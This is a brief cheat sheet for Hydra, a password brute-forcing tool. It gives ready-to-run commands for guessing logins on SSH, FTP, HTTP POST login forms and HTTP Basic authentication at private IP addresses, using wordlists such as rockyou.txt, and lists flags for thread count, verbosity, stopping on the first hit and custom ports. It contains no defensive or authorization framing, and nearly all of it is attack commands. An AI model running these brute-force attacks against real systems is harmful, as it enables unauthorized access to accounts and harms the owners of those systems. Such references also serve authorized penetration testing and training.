# Hydra Commands Cheat Sheet

## Basic Syntax
```bash
hydra -l [username] -p [password] [target_IP] [service]
hydra -L [user_list.txt] -P [pass_list.txt] [target_IP] [service]
```

## SSH Brute Forcing
- `hydra -l root -P rockyou.txt 192.168.1.10 ssh` - Brute-force SSH with a specific user and password list.
- `hydra -L users.txt -P passwords.txt 192.168.1.10 ssh -t 4` - Brute-force SSH using lists for both users and passwords, using 4 parallel tasks.

## FTP Brute Forcing
- `hydra -l admin -P rockyou.txt ftp://192.168.1.20` - Target FTP service.

## HTTP Form Brute Forcing (POST)
```bash
hydra -l admin -P passwords.txt 192.168.1.30 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect login"
```
*(Parameters: URL path : POST data format : Failure message string)*

## HTTP Basic Authentication
- `hydra -l admin -P passwords.txt 192.168.1.30 http-get /admin`

## Useful Flags
- `-t [num]` - Number of parallel tasks (threads). Default is usually 16. Reduce for unstable services.
- `-V` - Verbose mode (shows login attempts).
- `-f` - Exit immediately after finding the first valid login.
- `-s [port]` - Specify a non-standard port.
